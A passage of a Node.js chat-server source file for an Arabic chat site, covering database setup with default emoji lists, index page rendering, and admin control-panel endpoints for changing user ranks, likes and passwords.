              cmd: "msg",
              data: {
                bg: "",
                class: "pmrsgc",
                topic: wlc[rdm].adresse.split("<").join("&#x3C;") || "",
                msg: wlc[rdm].msg.split("<").join("&#x3C;") || "",
                ucol: "red",
                mcol: "#000000",
                pic: "room.png",
                uid: "",
              },
            });
          }
        });
        WlCMsg();
      }, 60000 * SiteSetting.msgst);
    }
  });
}

var iswlc = false;

function StartServer(state) {
  BackUpDataBase();
  RefreshUsers();
  if (state == 1) {
    RoomsRepo.createTable().then((table) => {
      if (table) {
        UsersRepo.dtl();
        RoomsRepo.dtl();
        SettingRepo.dtl();
        setTimeout(function () {
          process.exit(1);
        }, 3000);
      }
    });
  } else {
    RoomsRepo.createTable().then((table) => {
      if (table) {
        RoomsRepo.getById("D8D8A9A9C0").then((res) => {
          if (res) {
            RefreshRooms();
          } else {
            RoomsRepo.create({
              id: "D8D8A9A9C0",
              about: "غرفه عامة",
              user: "TigerHost",
              pass: "",
              needpass: false,
              broadcast: false,
              deleted: true,
              owner: "#1",
              collor: false,
              rmli: 0,
              topic: "الغرفة العامة",
              pic: "room.png",
              welcome: "مرحبا بيكم و حياكم في الغرفة العامة",
              max: 40,
            });
            setTimeout(function () {
              RefreshRooms();
            }, 500);
          }
        });
      }
    });

    SettingRepo.createTable().then((table) => {
      if (table) {
        SettingRepo.getById(1).then((res) => {
          if (res) {
            SiteSetting = JSON.parse(res.site);
            walllikes = JSON.parse(SiteSetting["walllikes"]);
            emos = JSON.parse(res.emo);
            dro3s = JSON.parse(res.dro3);
            sicos = JSON.parse(res.sico);
            if (iswlc == false) {
              iswlc = true;
              WlCMsg();
            }
          } else {
            SettingRepo.create({
              site: JSON.stringify({
                allowg: true,
                allowreg: true,
                background: Config.ColorBackground,
                bg: Config.ColorBG,
                buttons: Config.ColorButton,
                code: 8747,
                fileslikes: 90000,
                id: 1,
                msgst: 5,
                notlikes: 7000,
                pmlikes: 2000,
                miclikes: 5000,
                name: "",
                siteScript: "script.txt",
                title: Config.Title,
                sitedescription: Config.Description,
                sitekeywords: Config.Keywords,
                bclikes: Config.LikeBc,
                walllikes: JSON.stringify({
                  lengthMsgBc: 250,
                  lengthMsgPm: 250,
                  lengthMsgRoom: 250,
                  lengthUserG: 100,
                  lengthUserReg: 100,
                  likeMsgRoom: 8,
                  likeTopicEdit: 100,
                  likeUpImgBc: 500,
                  likeUpPic: 10,
                }),
                wallminutes: 0,
              }),
              dro3: JSON.stringify([
                "1604251747557.gif",
                "1604251758520.gif",
                "1604251760700.gif",
                "1604251763307.gif",
                "1604251765529.gif",
                "1604251767731.gif",
                "1604251769909.gif",
                "1604251774614.gif",
                "1604251779064.gif",
                "1604251782799.gif",
                "1604251786594.gif",
                "1604251790351.gif",
                "1604251794339.gif",
                "1604251798073.gif",
                "1604251802309.gif",
                "1604251806907.gif",
                "1604251810741.gif",
                "1604251814784.gif",
                "1604251819379.gif",
                "1604251823185.gif",
                "1604251827989.gif",
                "1604251831990.gif",
                "1604251838469.gif",
                "1604251842627.gif",
                "1604251846871.gif",
              ]),
              emo: JSON.stringify([
                "1604249548786.gif",
                "1604249552249.gif",
                "1604249557389.gif",
                "1604249559586.gif",
                "1604249562578.gif",
                "1604249565103.gif",
                "1604249567441.gif",
                "1604249569890.gif",
                "1604249571683.gif",
                "1604250112044.gif",
                "1604250114824.gif",
                "1604250117129.gif",
                "1604250119159.gif",
                "1604250121260.gif",
                "1604250123684.gif",
                "1604250127012.gif",
                "1604250130267.gif",
                "1604250132979.gif",
                "1604250135135.gif",
                "1604250137078.gif",
                "1604250139418.gif",
                "1604250141554.gif",
                "1604250143949.gif",
                "1604250148416.gif",
                "1604250151626.gif",
                "1604250157583.gif",
                "1604250161010.gif",
                "1604250164058.gif",
                "1604250167093.gif",
                "1604250301035.gif",
                "1604250303382.gif",
                "1604250305101.gif",
                "1604250307243.gif",
                "1604250309516.gif",
                "1604250311419.gif",
                "1604250313565.gif",
                "1604250315773.gif",
                "1604250323110.gif",
                "1604250325576.gif",
                "1604250327685.gif",
                "1604250329596.gif",
                "1604250331537.gif",
                "1604250333377.gif",
                "1604250334834.gif",
                "1604250336616.gif",
                "1604250340845.gif",
                "1604250346903.gif",
                "1604250349821.gif",
                "1604250354191.gif",
                "1604250358585.jpg",
                "1604250362533.gif",
                "1604250367896.gif",
                "1604250371828.gif",
                "1604250375168.gif",
                "1604250377594.gif",
                "1604250380972.gif",
                "1604250384257.gif",
                "1604250390033.gif",
                "1604250393546.gif",
                "1604250397003.gif",
                "1604250400613.gif",
                "1604250409783.gif",
                "1604250413521.gif",
                "1604250418953.gif",
                "1604250428173.gif",
                "1604250431155.gif",
                "1604250435106.gif",
                "1604250439658.gif",
                "1604250442352.gif",
                "1604250551879.gif",
                "1604250555824.gif",
                "1604250559464.gif",
                "1604250563413.gif",
                "1604250566534.gif",
                "1604250568887.gif",
                "1604250572365.gif",
                "1604250579238.gif",
                "1604250592362.gif",
                "1604250597399.gif",
                "1604250603151.gif",
                "1604250613781.gif",
                "1604250620547.gif",
                "1604266996909.gif",
                "1604267106601.gif",
                "1604267183015.gif",
                "1604268709762.gif",
                "1604268716314.gif",
                "1604268722266.gif",
                "1604268727700.gif",
                "1604268733058.gif",
                "1604270678107.gif",
                "1604270684014.gif",
                "1604270690418.gif",
                "1604270696386.gif",
                "1604270702962.gif",
                "1604270708211.gif",
                "1604270713261.gif",
                "1604270718635.gif",
                "1604270725155.gif",
                "1604270729648.gif",
                "1604271739357.gif",
                "1604271750817.gif",
                "1604271756616.gif",
                "1604271761902.gif",
                "1604280039934.png",
                "1604280206207.gif",
                "1604287427389.gif",
                "1604481943094.gif",
                "1604483666879.gif",
                "1605830633143.gif",
                "1605830635667.gif",
                "1605830637741.gif",
                "1605830640364.gif",
                "1605830646183.gif",
                "1605830648792.gif",
                "1605830651332.gif",
                "1605830653983.gif",
                "1605830656198.gif",
                "1605830671170.gif",
                "1605830683417.png",
                "1605830695027.gif",
                "1605830951762.gif",
                "1605830953762.gif",
                "1605830955927.gif",
                "1605830958729.gif",
                "1605830960670.gif",
                "1605830962609.gif",
                "1605830964865.gif",
                "1605830967037.gif",
                "1605830968785.gif",
                "1605830971041.gif",
                "1605830973374.gif",
                "1605830975384.gif",
                "1605830977358.gif",
                "1605830981248.gif",
                "1605830985392.jpg",
                "1605830988749.gif",
                "1605830995027.gif",
              ]),
              sico: JSON.stringify([
                "1604252172995.gif",
                "1604252176284.gif",
                "1604252184298.gif",
                "1604252186337.gif",
                "1604252189266.gif",
                "1604252190912.gif",
                "1604252193896.gif",
                "1604252195837.gif",
                "1604252198211.gif",
                "1604252200570.gif",
                "1604252202543.gif",
                "1604252206680.gif",
                "1604252209740.gif",
                "1604252220270.gif",
                "1604252225797.gif",
                "1604252235687.png",
                "1604252245119.png",
                "1604252250114.gif",
                "1604252254204.gif",
                "1604252257907.gif",
                "1604252260131.gif",
                "1604252264678.gif",
                "1604252268079.gif",
                "1604252274470.gif",
                "1604252284576.gif",
                "1604252287259.gif",
                "1604252290261.gif",
                "1604252292834.gif",
                "1604252295129.gif",
                "1604252297722.gif",
                "1604252299533.gif",
                "1604252301551.gif",
                "1604252303892.gif",
                "1604252308631.gif",
                "1604252318054.gif",
                "1604252324629.gif",
                "1604252327278.gif",
                "1604252330524.gif",
                "1604252333375.gif",
                "1604252335817.gif",
                "1604252340230.gif",
                "1604252342353.gif",
                "1604252344604.gif",
                "1604252363748.gif",
                "1604252368063.gif",
                "1604252370700.gif",
                "1604252378615.jpg",
              ]),
            });
            SettingRepo.getById(1).then((res) => {
              if (res) {
                SiteSetting = JSON.parse(res.site);
                walllikes = JSON.parse(SiteSetting["walllikes"]);
                emos = JSON.parse(res.emo);
                dro3s = JSON.parse(res.dro3);
                sicos = JSON.parse(res.sico);
                setTimeout(function () {
                  process.exit(1);
                }, 3000);
              }
            });
          }
        });
      }
    });
  }
}
StartServer(0);

function ValidateIPaddress(ipaddress) {
  if (
    /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/.test(
      ipaddress
    )
  ) {
    return true;
  }
  return false;
}

function findWord(word, str) {
  const allowedSeparator = "\\s,;\"'|";

  const regex = new RegExp(
    `(^.*[${allowedSeparator}]${word}$)|(^${word}[${allowedSeparator}].*)|(^${word}$)|(^.*[${allowedSeparator}]${word}[${allowedSeparator}].*$)`,

    // Case insensitive
    "i"
  );

  return regex.test(str);
}

function randomNumber(minimum, maximum) {
  return Math.round(Math.random() * (maximum - minimum) + minimum);
}

function stringGen(len) {
  var text = "";
  var charset = "abcdefghijklmnopqrstuvwxyz0123456789";
  for (var i = 0; i < len; i++)
    text += charset.charAt(Math.floor(Math.random() * charset.length));
  return text;
}

function toEnglishDigits(str) {
  var e = "۰".charCodeAt(0);
  str = str.replace(/[۰-۹]/g, function (t) {
    return t.charCodeAt(0) - e;
  });

  e = "٠".charCodeAt(0);
  str = str.replace(/[٠-٩]/g, function (t) {
    return t.charCodeAt(0) - e;
  });
  return str;
}

function getRandomInt(min, max) {
  min = Math.ceil(min);
  max = Math.floor(max);
  return Math.floor(Math.random() * (max - min)) + min;
}
var bodyParser = require("body-parser");

app.set("views", path.join(__dirname, "public"));
app.set("view engine", "ejs");

app.use(express.static(__dirname + "/public"));
app.use(
  cors({
    credentials: true,
    origin: "*",
  })
);

function filteredArray(arr, key, value) {
  const newArray = [];
  for (i = 0, l = arr.length; i < l; i++) {
    if (!arr[i][key]) {
      newArray.push(arr[i]);
    }
  }
  return newArray;
}

app.get("/", function (req, res) {
  hostname = req.hostname;
  HostRepo.getById(1).then((res) => {
    if (res) {
    } else {
      HostRepo.create({ hostname: hostname, setting: 1 });
      SiteRepo.create({ host: hostname, ids: 1 });
      RefreshHostList();
    }
  });

  const isdmoin = ListHost.findIndex((x) => x.hostname.includes(req.hostname));
  if (isdmoin != -1) {
    SettingRepo.getById(ListHost[isdmoin].setting).then((isdres) => {
      if (isdres) {
        var SiteSettings = JSON.parse(isdres.site);
        fs.readFile("uploads/" + SiteSettings["siteScript"], function (err, f) {
          if (f) {
            var array = f.toString().split("\n");
            array = JSON.parse(array);
            OwnerRepo.getById(1).then(function (own) {
              if (own) {
                SiteRepo.getById(ListHost[isdmoin].setting).then((issi) => {
                  if (issi) {
                    res.render("index", {
                      title: array["title"] || "",
                      logo: "/site/" + issi.logo,
                      banner: "/site/" + issi.banner,
                      pmpic: "/site/" + issi.pmpic,
                      prvpic: "/site/" + issi.prvpic,
                      prv2pic: "/site/" + issi.prv2pic,
                      prv3pic: "/site/" + issi.prv3pic,
                      storpic: "/site/" + issi.storpic,
                      online: filteredArray(online, "s", false).length,
                      namehost:
                        '<div class="fr borderg minix" style="color:lightslategrey;font-size: 15px!important;height: 26px;position: absolute;width: 409px;bottom: 0;padding: 2px;background-color: white;text-align: center;z-index: 99;">Copyright © 2022 <a title="صبايا العراق" class="mini" href="https://iraqiea.com/"> صبايا العراق </a>. All Rights Reserved</div>',
                      colors: {
                        hicolor: SiteSettings["background"],
                        bgcolor: SiteSettings["bg"],
                        btcolor: SiteSettings["buttons"],
                      },
                      ifbanner: own.isbanner,
                      ifbanner1: own.isbanner1,
                      ifbanner2: own.isbanner2,
                      ifbanner3: own.isbanner3,
                      script: String(array["settscr"]),
                      description: array["settdescription"] || "",
                      keywords: array["settkeywords"] || "",
                      istite: array["name"] || "",
                    });
                  }
                });
              }
            });
          }
        });
      } else {
        res.set("Content-Type", "text/html");
        res.write("<h4>Page Not Found 404</h4>");
        res.end();
      }
    });
  } else {
    res.set("Content-Type", "text/html");
    res.write("<h4>Page Not Found 404</h4>");
    res.end();
  }
});
function updtaed(data) {
  if (data) {
    if (UserInfo[data.id]) {
      UserInfo[data.id].rank = data.power;
      const mypower = ShowPowers.findIndex((x) => x.name == data.power);
      if (mypower != -1) {
        io.to(data.id).emit("msg", { cmd: "power", data: ShowPowers[mypower] });
      } else {
        io.to(data.id).emit("msg", { cmd: "power", data: Config.PowerNon });
      }
      const inme = online.findIndex((x) => x.id == data.id);
      if (inme != -1) {
        online[inme].power = data.power.split("<").join("&#x3C;");
        io.emit("msg", { cmd: "u^", data: online[inme] });
      }
    }
  }
}

function UserDisconnect(data) {
  const issou = isUserEntred.findIndex((x) => x.id == data.id);
  if (issou != -1) {
    isUserEntred.splice(
      isUserEntred.findIndex((v) => v.id == data.id),
      1
    );
  }
  var userData = UserInfo[data.id];
  if (typeof userData !== "undefined") {
    if (
      userData.username.toLowerCase().trim() !=
      AccountUserName.toLowerCase().trim()
    ) {
      if (VerStealthPanel(userData.rank) && userData.stealth) {
      } else {
        BandRepo.getByDIp({
          decoderDans: userData.username,
          device_band: userData.fp,
          ip_band: userData.ip,
          country_band: userData.code,
        }).then((band) => {
          if (band) {
          } else {
            if (userData.logout == false && userData.ismsg == false) {
              io.to(userData.idroom).emit("msg", {
                cmd: "msg",
                data: {
                  bg: userData.bg,
                  class: "hmsg",
                  id: data.id,
                  uid: data.id,
                  topic: userData.topic,
                  msg: "( هذا المستخدم قد غادر الدردشه )",
                  roomid: userData.idroom,
                  pic: userData.pic,
                  im2: userData.im2,
                },
              });
            }
          }
        });
      }
    }

    if (userData.uid && userData.islogin == "عضو" && data.state != 3) {
      UsersRepo.updateTokenAndSeen({
        token: stringGen(10),
        lastssen: new Date().getTime(),
        ip: userData.ip,
        fp: userData.fp,
        uid: userData.uid,
      });
    }
    if (userData.uid && userData.islogin == "عضو") {
      UsersRepo.updatelike({
        evaluation: userData.evaluation,
        pointsG: userData.pointsG,
        rep: userData.rep,
        uid: userData.uid,
      });
    }
    const isrooma = roomslists.findIndex((x) => x.id == userData.idroom);
    if (isrooma != -1) {
      if (roomslists[isrooma].broadcast) {
        for (var i = 1; i < 8; i++) {
          if (PeerRoom[userData.idroom][i].id == data.id) {
            PeerRoom[userData.idroom][i].id = "";
            PeerRoom[userData.idroom][i].ev = false;
            io.to(userData.idroom).emit("broadcasting", {
              cmd: "rleave",
              user: data.id,
            });
          }
        }
      }
    }
    // io.to(userData.idroom).emit("tyoff", { id: userData.id });

    // socket.leave(userData.idroom);

    io.emit("msg", { cmd: "ur", data: [data.id, null] });

    const indexue = UserEntre.findIndex((x) => x == data.id);
    if (indexue != -1) {
      UserEntre.splice(UserEntre.indexOf(data.id), 1);
    }

    const indexuea = ListIP.findIndex((x) => x == userData.ip);
    if (indexuea != -1) {
      ListIP.splice(ListIP.indexOf(userData.ip), 1);
    }

    setTimeout(function () {
      if (
        Offline &&
        userData.uid &&
        userData.islogin == "عضو" &&
        !userData.s &&
        data.state == 1
      ) {
        const isoffonline = online.findIndex((v) => v.id == data.id);
        if (isoffonline != -1) {
          online[isoffonline].stat = 3;
          online[isoffonline].time = null;
          online[isoffonline].roomid = null;
          userData.idroom = null;
          userData.offline = true;
          io.emit("msg", { cmd: "u^", data: online[isoffonline] });
        }
      } else {
        online.splice(
          online.findIndex((v) => v.id == data.id),
          1
        );
        io.emit("msg", { cmd: "u-", data: data.id });
        delete UserInfo[data.id];
      }
    }, 200);
  }
}

function ektisara(data) {
  const isdone = noletter.findIndex(
    (x) => String(data).includes(x.v) && x.path == "amsgs"
  );
  const noletter2 = noletter.findIndex(
    (x) => String(data).search(x.v) != -1 && x.path == "bmsgs"
  );
  if (noletter2 != -1 && isdone == -1) {
    return "";
  }
  return replaceEktisar(data);
}

app.get("/cp.nd", function (req, res) {
  UsersRepo.getByToken(req.query["token"]).then(function (data) {
    if (data && VerAdminPanel(data.power)) {
      const MyCpA = ShowPowers.findIndex((x) => x.name == data.power);
      if (req.query.cmd == "setpower") {
        if (MyCpA != -1) {
          if (!ShowPowers[MyCpA].setpower) {
            res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
            return;
          }
        }

        /*  if (req.query["power"] == "chatmaster" && data.power != "Hide" ) {
                    res.end(JSON.stringify({ err: true, msg: "هذه الترقية خاصة" }));
                    return;
                }*/
        UsersRepo.getById(req.query["id"]).then(function (uid) {
          if (uid) {
            if (
              VerPower({ to: data.power, me: uid.power }) &&
              VerPower({ to: data.power, me: req.query["power"] })
            ) {
              UsersRepo.updatePower({
                power: req.query["power"],
                idreg: req.query["id"],
              }).then((drlg) => {
                if (drlg) {
                  SubRepo.createTable().then((table) => {
                    if (table) {
                      UsersRepo.getById(req.query["id"]).then((isu) => {
                        if (isu) {
                          SubRepo.getByIdU(req.query["id"]).then((isres) => {
                            if (isres) {
                              SubRepo.update({
                                sub: req.query["power"],
                                timefinish: addDays(req.query["days"]),
                                timestart: new Date().getTime().toFixed(),
                                timeis: req.query["days"],
                                iduser: req.query["id"],
                              }).then((isres) => {
                                if (isres) {
                                  if (!req.query["power"]) {
                                    res.end(
                                      JSON.stringify({
                                        err: false,
                                        msg: "تم تنزيل رتبة المستخدم",
                                      })
                                    );
                                    updtaed({
                                      id: isu.id,
                                      power: req.query["power"],
                                    });
                                    savestate({
                                      state: "تعديل صلاحية",
                                      topic: data.topic,
                                      topic1:
                                        "[" +
                                        req.query["power"] +
                                        "] " +
                                        isu.topic,
                                      room: "",
                                      ip: data.ip,
                                      time: new Date().getTime(),
                                    });
                                    io.to(isu.id).emit("msg", {
                                      cmd: "alert",
                                      data: "تم تنزيل رتبتك",
                                    });
                                  } else {
                                    res.end(
                                      JSON.stringify({
                                        err: false,
                                        msg: "تم ترقية هذا المستخدم بنجاح",
                                      })
                                    );
                                    savestate({
                                      state: "تعديل صلاحية",
                                      topic: data.topic,
                                      topic1:
                                        "[" +
                                        req.query["power"] +
                                        "] " +
                                        isu.topic,
                                      room: "",
                                      ip: data.ip,
                                      time: new Date().getTime(),
                                    });
                                    updtaed({
                                      id: isu.id,
                                      power: req.query["power"],
                                    });
                                    // io.to(isu.id).emit("msg", { cmd: "alert", data:" لقد تمت ترقيتك الى "+req.query["power"] });
                                  }
                                }
                              });
                            } else {
                              SubRepo.create({
                                iduser: req.query["id"],
                                sub: req.query["power"],
                                topic: isu.username,
                                topic1: isu.topic,
                                timefinish: addDays(req.query["days"]),
                                timestart: new Date().getTime().toFixed(),
                                timeis: req.query["days"],
                              }).then((subdone) => {
                                if (subdone) {
                                  res.end(
                                    JSON.stringify({
                                      err: false,
                                      msg: "تم ترقية هذا المستخدم بنجاح",
                                    })
                                  );
                                  updtaed({
                                    id: isu.id,
                                    power: req.query["power"],
                                  });
                                  savestate({
                                    state: "تعديل صلاحية",
                                    topic: data.topic,
                                    topic1:
                                      "[" +
                                      req.query["power"] +
                                      "] " +
                                      isu.topic,
                                    room: "",
                                    ip: data.ip,
                                    time: new Date().getTime(),
                                  });

                                  // io.to(isu.id).emit("msg", { cmd: "alert", data: " لقد تمت ترقيتك الى "+req.query["power"] });
                                }
                              });
                            }
                          });
                        }
                      });
                    }
                  });
                }
              });
            } else {
              res.end(
                JSON.stringify({
                  err: true,
                  msg: "لا يمكنك التعديل على من هوا اعلى منك رتبة",
                })
              );
            }
          } else {
            res.end(
              JSON.stringify({ err: false, msg: "تم ترقية هذا الزائر بنجاح" })
            );
          }
        });
      }
    }
  });
});

app.get("/cp/cp.nd", function (req, res) {
  UsersRepo.getByToken(req.query["token"]).then(function (data) {
    if (data && VerAdminPanel(data.power)) {
      const MyCpA = ShowPowers.findIndex((x) => x.name == data.power);
      if (req.query.cmd == "addico") {
        if (MyCpA != -1) {
          if (!ShowPowers[MyCpA].owner) {
            res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
            return;
          }
        }
        if (req.query.tar == "sico") {
          sicos.push(req.query.pid);
          SettingRepo.updateSico({ sico: JSON.stringify(sicos), id: 1 });
          io.emit("msg", { cmd: "sicos", data: sicos });
          savestate({
            state: "إظافة بنر",
            topic: data.topic,
            topic1: data.username,
            room: "",
            ip: data.ip,
            time: new Date().getTime(),
          });
        } else if (req.query.tar == "dro3") {
          dro3s.push(req.query.pid);
          io.emit("msg", { cmd: "sicos", data: sicos });
          io.emit("msg", { cmd: "dro3", data: dro3s });
          SettingRepo.updateDro3({ dro3: JSON.stringify(dro3s), id: 1 });
          savestate({
            state: "إظافة هدية",
            topic: data.topic,
            topic1: data.username,
            room: "",
            ip: data.ip,
            time: new Date().getTime(),
          });
        } else if (req.query.tar == "emo") {
          emos.push(req.query.pid);
          io.emit("msg", { cmd: "emos", data: emos });
          SettingRepo.updateEmo({ emo: JSON.stringify(emos), id: 1 });
          savestate({
            state: "إظافة فيس ",
            topic: data.topic,
            topic1: data.username,
            room: "",
            ip: data.ip,
            time: new Date().getTime(),
          });
        } else if (req.query.tar == "logo") {
          SiteRepo.getById(req.query.hs).then(function (own) {
            if (own) {
              /*fs.unlink("uploads/site/" + own.logo, (err) => {
                        if (err) {
                            console.error(err);
                            return;
                        }
                    });*/
              SiteRepo.updateBannerLogo({
                img: req.query.pid,
                state: "logo",
                id: req.query.hs,
              });
              OwnerList();
            }
          });
        } else if (req.query.tar == "banner") {
          SiteRepo.getById(req.query.hs).then(function (own) {
            if (own) {
              /*fs.unlink("uploads/site/" + own.banner, (err) => {
                        if (err) {
                            console.error(err);
                            return;
                        }
                    });*/
              SiteRepo.updateBannerLogo({
                img: req.query.pid,
                state: "banner",
                id: req.query.hs,
              });
              OwnerList();
            }
          });
        } else if (req.query.tar == "pmpic") {
          SiteRepo.getById(req.query.hs).then(function (own) {
            if (own) {
              /*fs.unlink("uploads/site/" + own.banner, (err) => {
                        if (err) {
                            console.error(err);
                            return;
                        }
                    });*/
              SiteRepo.updateBannerLogo({
                img: req.query.pid,
                state: "pmpic",
                id: req.query.hs,
              });
              OwnerList();
            }
          });
        } else if (req.query.tar == "prv2pic") {
          SiteRepo.getById(req.query.hs).then(function (own) {
            if (own) {
              /*fs.unlink("uploads/site/" + own.banner, (err) => {
                        if (err) {
                            console.error(err);
                            return;
                        }
                    });*/
              SiteRepo.updateBannerLogo({
                img: req.query.pid,
                state: "prv2pic",
                id: req.query.hs,
              });
              OwnerList();
            }
          });
        } else if (req.query.tar == "prv3pic") {
          SiteRepo.getById(req.query.hs).then(function (own) {
            if (own) {
              /*fs.unlink("uploads/site/" + own.banner, (err) => {
                        if (err) {
                            console.error(err);
                            return;
                        }
                    });*/
              SiteRepo.updateBannerLogo({
                img: req.query.pid,
                state: "prv3pic",
                id: req.query.hs,
              });
              OwnerList();
            }
          });
        } else if (req.query.tar == "storpic") {
          SiteRepo.getById(req.query.hs).then(function (own) {
            if (own) {
              /*fs.unlink("uploads/site/" + own.banner, (err) => {
                        if (err) {
                            console.error(err);
                            return;
                        }
                    });*/
              SiteRepo.updateBannerLogo({
                img: req.query.pid,
                state: "storpic",
                id: req.query.hs,
              });
              OwnerList();
            }
          });
        } else if (req.query.tar == "prvpic") {
          SiteRepo.getById(req.query.hs).then(function (own) {
            if (own) {
              /*fs.unlink("uploads/site/" + own.banner, (err) => {
                        if (err) {
                            console.error(err);
                            return;
                        }
                    });*/
              SiteRepo.updateBannerLogo({
                img: req.query.pid,
                state: "prvpic",
                id: req.query.hs,
              });
              OwnerList();
            }
          });
        }
        res.end(
          JSON.stringify({
            err: false,
            msg: req.query.tar + "/" + req.query.pid,
          })
        );
      } else if (req.query.cmd == "likes") {
        if (!ShowPowers[MyCpA].ulike) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }

        if (req.query["rep"] > 9223372036854775807) {
          return;
        }
        UsersRepo.getById(req.query["id"]).then(function (uid) {
          if (uid) {
            if (VerPower({ to: data.power, me: uid.power })) {
              UsersRepo.updatelikeI({
                rep: req.query["rep"],
                idreg: req.query["id"],
              }).then((drlg) => {
                if (drlg) {
                  if (UserInfo[uid.id]) {
                    const indexa = online.findIndex((x) => x.id == uid.id);
                    if (indexa != -1) {
                      online[indexa].rep = req.query["rep"];
                      UserInfo[uid.id].rep = req.query["rep"];
                      io.emit("msg", { cmd: "u^", data: online[indexa] });
                    }
                  }
                  res.end(
                    JSON.stringify({ err: false, msg: "تم تعديل اللايكات" })
                  );
                  savestate({
                    state: "تعديل لايكات",
                    topic: data.topic,
                    topic1: uid.topic,
                    room: "",
                    ip: data.ip,
                    time: new Date().getTime(),
                  });
                }
              });
            } else {
              res.end(
                JSON.stringify({
                  err: true,
                  msg: "لا يمكنك التعديل على من هوا اعلى منك رتبة",
                })
              );
            }
          }
        });
      } else if (req.query.cmd == "pwd") {
        if (!ShowPowers[MyCpA].mynick) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        UsersRepo.getById(req.query["id"]).then(function (uid) {
          if (uid) {
            if (req.query["pwd"].length >= 4) {
              if (VerPower({ to: data.power, me: uid.power })) {
                UsersRepo.updatePass({
                  password: passwordHash.generate(req.query["pwd"]),
                  idreg: req.query["id"],
                }).then((drlg) => {
                  if (drlg) {
                    res.end(
                      JSON.stringify({ err: false, msg: "تم تعديل كلمة السر" })
                    );
                    savestate({
                      state: "تعديل كلمة السر",
                      topic: data.topic,
                      topic1: uid.topic,
                      room: "",
                      ip: data.ip,
                      time: new Date().getTime(),
                    });
                    io.to(uid.id).emit("msg", {
                      cmd: "alert",
                      data: "تم تغير كلمه سر لخاصه بك",
                    });
                  }
                });
              } else {
                res.end(
                  JSON.stringify({
                    err: true,
                    msg: "لا يمكنك التعديل على من هوا اعلى منك رتبة",
                  })
                );
              }
            } else {
              res.end(
                JSON.stringify({
                  err: true,
                  msg: "الرجاء التاكد من كلمة المرور",
                })
              );
            }
          }
        });
      } else if (req.query.cmd == "subs") {
        if (!ShowPowers[MyCpA].subs) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        SubRepo.getAll().then((SubSh) => {
          if (SubSh) {
            UsersRepo.getAll().then((isdata) => {
              if (isdata) {
                res.end(
                  JSON.stringify({
                    data: SubSh,
                    powers: ShowPowers,
                    users: isdata,
                  })
                );
              }
            });
          }
        });
      } else if (req.query.cmd == "setpower") {
        if (!ShowPowers[MyCpA].setpower) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        UsersRepo.getById(req.query["id"]).then(function (uid) {
          if (uid) {
            if (
              VerPower({ to: data.power, me: uid.power }) &&
              VerPower({ to: data.power, me: req.query["power"] })
            ) {
              UsersRepo.updatePower({
                power: req.query["power"],
                idreg: req.query["id"],
              }).then((drlg) => {
                if (drlg) {
                  SubRepo.createTable().then((table) => {
                    if (table) {
                      UsersRepo.getById(req.query["id"]).then((isu) => {
                        if (isu) {
                          SubRepo.getByIdU(req.query["id"]).then((isres) => {
                            if (isres) {
                              SubRepo.update({
                                sub: req.query["power"],
                                timefinish: addDays(req.query["days"]),
                                timestart: new Date().getTime().toFixed(),
                                timeis: req.query["days"],
                                iduser: req.query["id"],
                              }).then((isres) => {
                                if (isres) {
                                  if (!req.query["power"]) {
                                    res.end(
                                      JSON.stringify({
                                        err: false,
                                        msg: "تم تنزيل رتبة المستخدم",
                                      })
                                    );
                                    savestate({
                                      state: "تعديل صلاحيه",
                                      topic: data.topic,
                                      topic1:
                                        "[" +
                                        req.query["power"] +
                                        "] " +
                                        uid.topic,
                                      room: "",
                                      ip: data.ip,
                                      time: new Date().getTime(),
                                    });
                                    updtaed({
                                      id: isu.id,
                                      power: req.query["power"],
                                    });
                                    io.to(isu.id).emit("msg", {
                                      cmd: "alert",
                                      data: "تم تنزيل رتبتك",
                                    });
                                  } else {
                                    res.end(
                                      JSON.stringify({
                                        err: false,
                                        msg: "تم ترقية هذا المستخدم بنجاح",
                                      })
                                    );
                                    savestate({
                                      state: "تعديل صلاحيه",
                                      topic: data.topic,
                                      topic1:
                                        "[" +
                                        req.query["power"] +
                                        "] " +
                                        uid.topic,
                                      room: "",
                                      ip: data.ip,
                                      time: new Date().getTime(),
                                    });
                                    updtaed({
                                      id: isu.id,
                                      power: req.query["power"],
                                    });
                                    // io.to(isu.id).emit("msg", { cmd: "alert", data: " لقد تمت ترقيتك الى "+req.query["power"] });
                                  }
                                }
                              });
                            } else {
                              SubRepo.create({
                                iduser: req.query["id"],
                                sub: req.query["power"],
                                topic: isu.username,
                                topic1: isu.topic,
                                timefinish: addDays(req.query["days"]),
                                timestart: new Date().getTime().toFixed(),
                                timeis: req.query["days"],
                              }).then((subdone) => {
                                if (subdone) {
                                  res.end(
                                    JSON.stringify({
                                      err: false,
                                      msg: "تم ترقية هذا المستخدم بنجاح",
                                    })
                                  );
                                  savestate({
                                    state: "ترقية حساب",
                                    topic: data.topic,
                                    topic1:
                                      "[" +
                                      req.query["power"] +
                                      "] " +
                                      uid.topic,
                                    room: "",
                                    ip: data.ip,
                                    time: new Date().getTime(),
                                  });
                                  updtaed({
                                    id: isu.id,
                                    power: req.query["power"],
                                  });
                                  // io.to(isu.id).emit("msg", { cmd: "alert", data:" لقد تمت ترقيتك الى "+ req.query["power"] });
                                }
                              });
                            }
                          });
                        }
                      });
                    }
                  });
                }
              });
            } else {
              res.end(
                JSON.stringify({
                  err: true,
                  msg: "لا يمكنك التعديل على من هوا اعلى منك رتبة",
                })
              );
            }
          }
        });
      } else if (req.query.cmd == "dellogin") {
        if (!ShowPowers[MyCpA].edituser) {
          res.end(JSON.stringify({ err: true, msg: "لا تملك صلاحية" }));
          return;
        }
        UsersRepo.getById(req.query["id"]).then(function (uid) {
          if (uid) {
            if (VerPower({ to: data.power, me: uid.power })) {
              if (UserInfo[uid.id] && UserInfo[data.id]) {
                if (UserInfo[uid.id].idroom) {
                  io.to(UserInfo[uid.id].idroom).emit("msg", {
                    cmd: "msg",
                    data: {
                      bg: uid.bg,
                      class: "hmsg",
